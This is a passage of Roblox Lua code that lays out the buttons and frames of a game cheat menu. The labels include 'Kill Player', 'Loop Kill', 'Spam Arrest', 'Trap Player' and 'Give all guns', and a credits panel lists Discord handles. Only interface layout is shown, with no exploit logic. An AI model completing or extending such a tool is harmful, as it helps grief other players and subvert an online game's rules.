ProjectAntiAbusers.UICorner_23.Parent = ProjectAntiAbusers.makeinmatecrim

ProjectAntiAbusers.makeneutralcrim.Name = "makeneutralcrim"
ProjectAntiAbusers.makeneutralcrim.Parent = ProjectAntiAbusers.BorderFrame
ProjectAntiAbusers.makeneutralcrim.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.makeneutralcrim.Position = UDim2.new(0.116972864, 0, 0.691576779, 0)
ProjectAntiAbusers.makeneutralcrim.Size = UDim2.new(0, 141, 0, 32)
ProjectAntiAbusers.makeneutralcrim.Font = Enum.Font.SourceSans
ProjectAntiAbusers.makeneutralcrim.Text = "Make Neutral Crim"
ProjectAntiAbusers.makeneutralcrim.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.makeneutralcrim.TextSize = 17.000

ProjectAntiAbusers.UICorner_24.Parent = ProjectAntiAbusers.makeneutralcrim

ProjectAntiAbusers.BorderFrame_2.Name = "BorderFrame"
ProjectAntiAbusers.BorderFrame_2.Parent = ProjectAntiAbusers.BringStuffFrame
ProjectAntiAbusers.BorderFrame_2.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.BorderFrame_2.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.BorderFrame_2.BorderSizePixel = 2
ProjectAntiAbusers.BorderFrame_2.Position = UDim2.new(0.025062656, 0, 0.0423728824, 0)
ProjectAntiAbusers.BorderFrame_2.Size = UDim2.new(0, 184, 0, 131)

ProjectAntiAbusers.bringteamtextbox.Name = "bringteamtextbox"
ProjectAntiAbusers.bringteamtextbox.Parent = ProjectAntiAbusers.BorderFrame_2
ProjectAntiAbusers.bringteamtextbox.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.bringteamtextbox.Position = UDim2.new(0.00550901331, 0, 0.000526096672, 0)
ProjectAntiAbusers.bringteamtextbox.Size = UDim2.new(0, 183, 0, 39)
ProjectAntiAbusers.bringteamtextbox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.bringteamtextbox.Text = "Bring Teams"
ProjectAntiAbusers.bringteamtextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.bringteamtextbox.TextSize = 21.000

ProjectAntiAbusers.UICorner_25.Parent = ProjectAntiAbusers.bringteamtextbox

ProjectAntiAbusers.BringCopTeam.Name = "Bring Cop Team"
ProjectAntiAbusers.BringCopTeam.Parent = ProjectAntiAbusers.BorderFrame_2
ProjectAntiAbusers.BringCopTeam.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.BringCopTeam.Position = UDim2.new(0.00332359667, 0, 0.339888722, 0)
ProjectAntiAbusers.BringCopTeam.Size = UDim2.new(0, 86, 0, 32)
ProjectAntiAbusers.BringCopTeam.Font = Enum.Font.SourceSans
ProjectAntiAbusers.BringCopTeam.Text = "Bring Guards"
ProjectAntiAbusers.BringCopTeam.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.BringCopTeam.TextSize = 15.000

ProjectAntiAbusers.UICorner_26.Parent = ProjectAntiAbusers.BringCopTeam

ProjectAntiAbusers.Bringinmate.Name = "Bring inmate"
ProjectAntiAbusers.Bringinmate.Parent = ProjectAntiAbusers.BorderFrame_2
ProjectAntiAbusers.Bringinmate.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.Bringinmate.Position = UDim2.new(0.528617859, 0, 0.335651428, 0)
ProjectAntiAbusers.Bringinmate.Size = UDim2.new(0, 86, 0, 33)
ProjectAntiAbusers.Bringinmate.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Bringinmate.Text = "Bring Inmates"
ProjectAntiAbusers.Bringinmate.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Bringinmate.TextSize = 15.000

ProjectAntiAbusers.UICorner_27.Parent = ProjectAntiAbusers.Bringinmate

ProjectAntiAbusers.Bringcrim.Name = "Bring crim"
ProjectAntiAbusers.Bringcrim.Parent = ProjectAntiAbusers.BorderFrame_2
ProjectAntiAbusers.Bringcrim.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.Bringcrim.Position = UDim2.new(0.528617859, 0, 0.696856081, 0)
ProjectAntiAbusers.Bringcrim.Size = UDim2.new(0, 86, 0, 31)
ProjectAntiAbusers.Bringcrim.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Bringcrim.Text = "Bring Criminals"
ProjectAntiAbusers.Bringcrim.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Bringcrim.TextSize = 15.000

ProjectAntiAbusers.UICorner_28.Parent = ProjectAntiAbusers.Bringcrim

ProjectAntiAbusers.BringNeutralteam.Name = "Bring Neutral team"
ProjectAntiAbusers.BringNeutralteam.Parent = ProjectAntiAbusers.BorderFrame_2
ProjectAntiAbusers.BringNeutralteam.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
ProjectAntiAbusers.BringNeutralteam.Position = UDim2.new(0.00332352519, 0, 0.693427384, 0)
ProjectAntiAbusers.BringNeutralteam.Size = UDim2.new(0, 86, 0, 32)
ProjectAntiAbusers.BringNeutralteam.Font = Enum.Font.SourceSans
ProjectAntiAbusers.BringNeutralteam.Text = "Bring Neutral"
ProjectAntiAbusers.BringNeutralteam.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.BringNeutralteam.TextSize = 15.000

ProjectAntiAbusers.UICorner_29.Parent = ProjectAntiAbusers.BringNeutralteam

ProjectAntiAbusers.CreditsFrame.Name = "CreditsFrame"
ProjectAntiAbusers.CreditsFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.CreditsFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.CreditsFrame.Position = UDim2.new(0.218999982, 0, 0.0946923196, 0)
ProjectAntiAbusers.CreditsFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.CreditsFrame.Visible = false

ProjectAntiAbusers.UICorner_30.Parent = ProjectAntiAbusers.CreditsFrame

ProjectAntiAbusers.Frame.Parent = ProjectAntiAbusers.CreditsFrame
ProjectAntiAbusers.Frame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.Frame.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.Frame.BorderSizePixel = 2
ProjectAntiAbusers.Frame.Position = UDim2.new(0.025062656, 0, 0.228813559, 0)
ProjectAntiAbusers.Frame.Size = UDim2.new(0, 186, 0, 146)

ProjectAntiAbusers.Frame_2.Parent = ProjectAntiAbusers.CreditsFrame
ProjectAntiAbusers.Frame_2.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.Frame_2.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.Frame_2.BorderSizePixel = 2
ProjectAntiAbusers.Frame_2.Position = UDim2.new(0.513784468, 0, 0.228813559, 0)
ProjectAntiAbusers.Frame_2.Size = UDim2.new(0, 186, 0, 146)

ProjectAntiAbusers.TextLabel_14.Parent = ProjectAntiAbusers.CreditsFrame
ProjectAntiAbusers.TextLabel_14.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.TextLabel_14.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.TextLabel_14.BorderSizePixel = 2
ProjectAntiAbusers.TextLabel_14.Position = UDim2.new(0.0751879662, 0, 0.152542368, 0)
ProjectAntiAbusers.TextLabel_14.Size = UDim2.new(0, 144, 0, 32)
ProjectAntiAbusers.TextLabel_14.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_14.Text = "Ui Designers"
ProjectAntiAbusers.TextLabel_14.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_14.TextSize = 21.000

ProjectAntiAbusers.TextLabel_15.Parent = ProjectAntiAbusers.CreditsFrame
ProjectAntiAbusers.TextLabel_15.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.TextLabel_15.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.TextLabel_15.BorderSizePixel = 2
ProjectAntiAbusers.TextLabel_15.Position = UDim2.new(0.573934853, 0, 0.152542368, 0)
ProjectAntiAbusers.TextLabel_15.Size = UDim2.new(0, 144, 0, 32)
ProjectAntiAbusers.TextLabel_15.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_15.Text = "Scripter/Owner"
ProjectAntiAbusers.TextLabel_15.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_15.TextSize = 21.000

ProjectAntiAbusers.TextLabel_16.Parent = ProjectAntiAbusers.CreditsFrame
ProjectAntiAbusers.TextLabel_16.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_16.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.TextLabel_16.BorderSizePixel = 2
ProjectAntiAbusers.TextLabel_16.Position = UDim2.new(0.0751879662, 0, 0.618644059, 0)
ProjectAntiAbusers.TextLabel_16.Size = UDim2.new(0, 144, 0, 32)
ProjectAntiAbusers.TextLabel_16.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_16.Text = "the ok chipmunk#2871"
ProjectAntiAbusers.TextLabel_16.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_16.TextSize = 18.000

ProjectAntiAbusers.UICorner_31.Parent = ProjectAntiAbusers.TextLabel_16

ProjectAntiAbusers.TextLabel_17.Parent = ProjectAntiAbusers.CreditsFrame
ProjectAntiAbusers.TextLabel_17.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_17.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.TextLabel_17.BorderSizePixel = 2
ProjectAntiAbusers.TextLabel_17.Position = UDim2.new(0.0751879662, 0, 0.385593235, 0)
ProjectAntiAbusers.TextLabel_17.Size = UDim2.new(0, 144, 0, 32)
ProjectAntiAbusers.TextLabel_17.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_17.Text = "NecroMedia#6161"
ProjectAntiAbusers.TextLabel_17.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_17.TextSize = 21.000

ProjectAntiAbusers.UICorner_32.Parent = ProjectAntiAbusers.TextLabel_17

ProjectAntiAbusers.TextLabel_18.Parent = ProjectAntiAbusers.CreditsFrame
ProjectAntiAbusers.TextLabel_18.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TextLabel_18.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.TextLabel_18.BorderSizePixel = 2
ProjectAntiAbusers.TextLabel_18.Position = UDim2.new(0.576441109, 0, 0.504237294, 0)
ProjectAntiAbusers.TextLabel_18.Size = UDim2.new(0, 144, 0, 32)
ProjectAntiAbusers.TextLabel_18.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TextLabel_18.Text = "Chaotic Mind#0666"
ProjectAntiAbusers.TextLabel_18.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TextLabel_18.TextSize = 21.000

ProjectAntiAbusers.UICorner_33.Parent = ProjectAntiAbusers.TextLabel_18

ProjectAntiAbusers.GlobalButtonsFrame.Name = "GlobalButtonsFrame"
ProjectAntiAbusers.GlobalButtonsFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.GlobalButtonsFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.GlobalButtonsFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.GlobalButtonsFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.GlobalButtonsFrame.Visible = false

ProjectAntiAbusers.UICorner_34.Parent = ProjectAntiAbusers.GlobalButtonsFrame

ProjectAntiAbusers.UsernameTextBox.Name = "UsernameTextBox"
ProjectAntiAbusers.UsernameTextBox.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.UsernameTextBox.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.UsernameTextBox.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.UsernameTextBox.BorderSizePixel = 2
ProjectAntiAbusers.UsernameTextBox.Position = UDim2.new(0.0275689214, 0, 0.0296610165, 0)
ProjectAntiAbusers.UsernameTextBox.Size = UDim2.new(0, 175, 0, 48)
ProjectAntiAbusers.UsernameTextBox.Font = Enum.Font.SourceSans
ProjectAntiAbusers.UsernameTextBox.PlaceholderText = "Username Here!"
ProjectAntiAbusers.UsernameTextBox.Text = ""
ProjectAntiAbusers.UsernameTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.UsernameTextBox.TextSize = 19.000

ProjectAntiAbusers.KillPlayer.Name = "KillPlayer"
ProjectAntiAbusers.KillPlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.KillPlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.KillPlayer.Position = UDim2.new(0.0275689214, 0, 0.283898294, 0)
ProjectAntiAbusers.KillPlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.KillPlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.KillPlayer.Text = "Kill Player"
ProjectAntiAbusers.KillPlayer.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.KillPlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_35.Parent = ProjectAntiAbusers.KillPlayer

ProjectAntiAbusers.TazePlayer.Name = "TazePlayer"
ProjectAntiAbusers.TazePlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.TazePlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TazePlayer.Position = UDim2.new(0.25313282, 0, 0.283898294, 0)
ProjectAntiAbusers.TazePlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.TazePlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TazePlayer.Text = "Taze Player"
ProjectAntiAbusers.TazePlayer.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TazePlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_36.Parent = ProjectAntiAbusers.TazePlayer

ProjectAntiAbusers.BringPlayer.Name = "BringPlayer"
ProjectAntiAbusers.BringPlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.BringPlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.BringPlayer.Position = UDim2.new(0.0275689121, 0, 0.423728824, 0)
ProjectAntiAbusers.BringPlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.BringPlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.BringPlayer.Text = "Bring Player"
ProjectAntiAbusers.BringPlayer.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.BringPlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_37.Parent = ProjectAntiAbusers.BringPlayer

ProjectAntiAbusers.ArrestPlayer.Name = "ArrestPlayer"
ProjectAntiAbusers.ArrestPlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.ArrestPlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ArrestPlayer.Position = UDim2.new(0.25313282, 0, 0.419491529, 0)
ProjectAntiAbusers.ArrestPlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.ArrestPlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ArrestPlayer.Text = "Arrest Player"
ProjectAntiAbusers.ArrestPlayer.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.ArrestPlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_38.Parent = ProjectAntiAbusers.ArrestPlayer

ProjectAntiAbusers.MakeCrimKill.Name = "MakeCrimKill"
ProjectAntiAbusers.MakeCrimKill.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.MakeCrimKill.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.MakeCrimKill.Position = UDim2.new(0.027568914, 0, 0.563559294, 0)
ProjectAntiAbusers.MakeCrimKill.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.MakeCrimKill.Font = Enum.Font.SourceSans
ProjectAntiAbusers.MakeCrimKill.Text = "Make Crim(Kill Method)"
ProjectAntiAbusers.MakeCrimKill.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.MakeCrimKill.TextScaled = true
ProjectAntiAbusers.MakeCrimKill.TextSize = 14.000
ProjectAntiAbusers.MakeCrimKill.TextWrapped = true

ProjectAntiAbusers.UICorner_39.Parent = ProjectAntiAbusers.MakeCrimKill

ProjectAntiAbusers.MakeCrimBring.Name = "MakeCrimBring"
ProjectAntiAbusers.MakeCrimBring.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.MakeCrimBring.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.MakeCrimBring.Position = UDim2.new(0.25313282, 0, 0.563559294, 0)
ProjectAntiAbusers.MakeCrimBring.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.MakeCrimBring.Font = Enum.Font.SourceSans
ProjectAntiAbusers.MakeCrimBring.Text = "Make Crim(Bring Method)"
ProjectAntiAbusers.MakeCrimBring.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.MakeCrimBring.TextScaled = true
ProjectAntiAbusers.MakeCrimBring.TextSize = 14.000
ProjectAntiAbusers.MakeCrimBring.TextWrapped = true

ProjectAntiAbusers.UICorner_40.Parent = ProjectAntiAbusers.MakeCrimBring

ProjectAntiAbusers.TrapPlayer.Name = "TrapPlayer"
ProjectAntiAbusers.TrapPlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.TrapPlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TrapPlayer.Position = UDim2.new(0.0275689065, 0, 0.703389823, 0)
ProjectAntiAbusers.TrapPlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.TrapPlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TrapPlayer.Text = "Trap Player"
ProjectAntiAbusers.TrapPlayer.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TrapPlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_41.Parent = ProjectAntiAbusers.TrapPlayer

ProjectAntiAbusers.DropPlayer.Name = "DropPlayer"
ProjectAntiAbusers.DropPlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.DropPlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.DropPlayer.Position = UDim2.new(0.25313282, 0, 0.703389823, 0)
ProjectAntiAbusers.DropPlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.DropPlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.DropPlayer.Text = "Drop Player"
ProjectAntiAbusers.DropPlayer.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.DropPlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_42.Parent = ProjectAntiAbusers.DropPlayer

ProjectAntiAbusers.VoidPlayer.Name = "VoidPlayer"
ProjectAntiAbusers.VoidPlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.VoidPlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.VoidPlayer.Position = UDim2.new(0.0275689065, 0, 0.847457647, 0)
ProjectAntiAbusers.VoidPlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.VoidPlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.VoidPlayer.Text = "Void Player"
ProjectAntiAbusers.VoidPlayer.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.VoidPlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_43.Parent = ProjectAntiAbusers.VoidPlayer

ProjectAntiAbusers.LoopKillPlayer.Name = "LoopKillPlayer"
ProjectAntiAbusers.LoopKillPlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.LoopKillPlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.LoopKillPlayer.Position = UDim2.new(0.25313282, 0, 0.847457647, 0)
ProjectAntiAbusers.LoopKillPlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.LoopKillPlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.LoopKillPlayer.Text = "Loop Kill"
ProjectAntiAbusers.LoopKillPlayer.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.LoopKillPlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_44.Parent = ProjectAntiAbusers.LoopKillPlayer

ProjectAntiAbusers.SpamArrest.Name = "SpamArrest"
ProjectAntiAbusers.SpamArrest.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.SpamArrest.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.SpamArrest.Position = UDim2.new(0.498746872, 0, 0.0254237652, 0)
ProjectAntiAbusers.SpamArrest.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.SpamArrest.Font = Enum.Font.SourceSans
ProjectAntiAbusers.SpamArrest.Text = "Spam Arrest"
ProjectAntiAbusers.SpamArrest.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.SpamArrest.TextSize = 16.000

ProjectAntiAbusers.UICorner_45.Parent = ProjectAntiAbusers.SpamArrest

ProjectAntiAbusers.ViewPlayer.Name = "ViewPlayer"
ProjectAntiAbusers.ViewPlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.ViewPlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.ViewPlayer.Position = UDim2.new(0.731829584, 0, 0.0254237652, 0)
ProjectAntiAbusers.ViewPlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.ViewPlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.ViewPlayer.Text = "View Player"
ProjectAntiAbusers.ViewPlayer.TextColor3 = Color3.fromRGB(255, 0, 0)
ProjectAntiAbusers.ViewPlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_46.Parent = ProjectAntiAbusers.ViewPlayer

ProjectAntiAbusers.UserInfo.Name = "UserInfo"
ProjectAntiAbusers.UserInfo.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.UserInfo.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.UserInfo.Position = UDim2.new(0.498746872, 0, 0.161016986, 0)
ProjectAntiAbusers.UserInfo.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.UserInfo.Font = Enum.Font.SourceSans
ProjectAntiAbusers.UserInfo.Text = "User Info"
ProjectAntiAbusers.UserInfo.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.UserInfo.TextSize = 16.000

ProjectAntiAbusers.UICorner_47.Parent = ProjectAntiAbusers.UserInfo

ProjectAntiAbusers.Who.Name = "Who"
ProjectAntiAbusers.Who.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.Who.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.Who.Position = UDim2.new(0.731829584, 0, 0.296610206, 0)
ProjectAntiAbusers.Who.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.Who.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Who.Text = "Who?"
ProjectAntiAbusers.Who.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Who.TextSize = 16.000

ProjectAntiAbusers.UICorner_48.Parent = ProjectAntiAbusers.Who

ProjectAntiAbusers.TpToPlayer.Name = "TpToPlayer"
ProjectAntiAbusers.TpToPlayer.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.TpToPlayer.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.TpToPlayer.Position = UDim2.new(0.498746872, 0, 0.296610206, 0)
ProjectAntiAbusers.TpToPlayer.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.TpToPlayer.Font = Enum.Font.SourceSans
ProjectAntiAbusers.TpToPlayer.Text = "Tp To Player"
ProjectAntiAbusers.TpToPlayer.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.TpToPlayer.TextSize = 16.000

ProjectAntiAbusers.UICorner_49.Parent = ProjectAntiAbusers.TpToPlayer

ProjectAntiAbusers.SuicideStuffFrame.Name = "SuicideStuffFrame"
ProjectAntiAbusers.SuicideStuffFrame.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.SuicideStuffFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.SuicideStuffFrame.BorderColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.SuicideStuffFrame.BorderSizePixel = 2
ProjectAntiAbusers.SuicideStuffFrame.Position = UDim2.new(0.501253128, 0, 0.427966088, 0)
ProjectAntiAbusers.SuicideStuffFrame.Size = UDim2.new(0, 192, 0, 124)

ProjectAntiAbusers.SuicideKnife.Name = "SuicideKnife"
ProjectAntiAbusers.SuicideKnife.Parent = ProjectAntiAbusers.SuicideStuffFrame
ProjectAntiAbusers.SuicideKnife.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.SuicideKnife.Position = UDim2.new(0.0364583321, 0, 0.052346997, 0)
ProjectAntiAbusers.SuicideKnife.Size = UDim2.new(0, 179, 0, 47)
ProjectAntiAbusers.SuicideKnife.Font = Enum.Font.SourceSans
ProjectAntiAbusers.SuicideKnife.Text = "suicide no animation"
ProjectAntiAbusers.SuicideKnife.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.SuicideKnife.TextSize = 21.000

ProjectAntiAbusers.UICorner_50.Parent = ProjectAntiAbusers.SuicideKnife

ProjectAntiAbusers.SuicideGun.Name = "SuicideGun"
ProjectAntiAbusers.SuicideGun.Parent = ProjectAntiAbusers.SuicideStuffFrame
ProjectAntiAbusers.SuicideGun.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.SuicideGun.Position = UDim2.new(0.0364583321, 0, 0.568476021, 0)
ProjectAntiAbusers.SuicideGun.Size = UDim2.new(0, 179, 0, 47)
ProjectAntiAbusers.SuicideGun.Font = Enum.Font.SourceSans
ProjectAntiAbusers.SuicideGun.Text = "Suicide Gun"
ProjectAntiAbusers.SuicideGun.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.SuicideGun.TextSize = 21.000

ProjectAntiAbusers.UICorner_51.Parent = ProjectAntiAbusers.SuicideGun

ProjectAntiAbusers.WriteInfo.Name = "WriteInfo"
ProjectAntiAbusers.WriteInfo.Parent = ProjectAntiAbusers.GlobalButtonsFrame
ProjectAntiAbusers.WriteInfo.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.WriteInfo.Position = UDim2.new(0.731829584, 0, 0.161016986, 0)
ProjectAntiAbusers.WriteInfo.Size = UDim2.new(0, 86, 0, 27)
ProjectAntiAbusers.WriteInfo.Font = Enum.Font.SourceSans
ProjectAntiAbusers.WriteInfo.Text = "Write Info"
ProjectAntiAbusers.WriteInfo.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.WriteInfo.TextSize = 16.000

ProjectAntiAbusers.UICorner_52.Parent = ProjectAntiAbusers.WriteInfo

ProjectAntiAbusers.GunstuffFrame.Name = "GunstuffFrame"
ProjectAntiAbusers.GunstuffFrame.Parent = ProjectAntiAbusers.Background
ProjectAntiAbusers.GunstuffFrame.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
ProjectAntiAbusers.GunstuffFrame.Position = UDim2.new(0.218999997, 0, 0.0869999975, 0)
ProjectAntiAbusers.GunstuffFrame.Size = UDim2.new(0, 399, 0, 236)
ProjectAntiAbusers.GunstuffFrame.Visible = false

ProjectAntiAbusers.UICorner_53.Parent = ProjectAntiAbusers.GunstuffFrame

ProjectAntiAbusers.giveallgunsbutton.Name = "giveallgunsbutton"
ProjectAntiAbusers.giveallgunsbutton.Parent = ProjectAntiAbusers.GunstuffFrame
ProjectAntiAbusers.giveallgunsbutton.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
ProjectAntiAbusers.giveallgunsbutton.Position = UDim2.new(0.0300751887, 0, 0.0423728824, 0)
ProjectAntiAbusers.giveallgunsbutton.Size = UDim2.new(0, 175, 0, 45)
ProjectAntiAbusers.giveallgunsbutton.Font = Enum.Font.SourceSans
ProjectAntiAbusers.giveallgunsbutton.Text = "Give all guns"
ProjectAntiAbusers.giveallgunsbutton.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.giveallgunsbutton.TextSize = 17.000

ProjectAntiAbusers.UICorner_54.Parent = ProjectAntiAbusers.giveallgunsbutton

